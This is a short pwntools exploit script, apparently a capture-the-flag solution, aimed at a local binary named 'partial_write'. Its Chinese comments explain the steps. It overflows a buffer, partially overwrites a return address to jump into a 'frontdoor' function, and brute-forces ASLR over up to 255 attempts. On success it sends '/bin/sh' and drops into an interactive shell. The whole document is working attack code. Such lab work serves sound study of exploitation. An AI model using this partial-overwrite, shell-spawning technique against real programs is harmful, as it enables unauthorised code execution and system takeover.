from pwn import *
i = 0
while True:
	i += 1
	print (i)
	if(i > 0xff):
		print("Wrong!")
		break
	io = process("./partial_write")	
	io.recv()
	payload = 'a'*40					
	payload += '\xca'					
	io.sendline(payload)
	io.recv()
	payload = 'a'*200					
	payload += '\x01\x39'				#frontdoor的地址后三位是0x900, +1跳过push rbp
	io.sendline(payload)
	io.recv()
	try:
		io.recv(timeout = 1)			
	except EOFError:
		io.close()
		continue
	else:
		sleep(0.1)
		io.sendline('/bin/sh\x00')
		sleep(0.1)						
		io.interactive()				#没有EOFError的话就是爆破成功，可以开shell
		break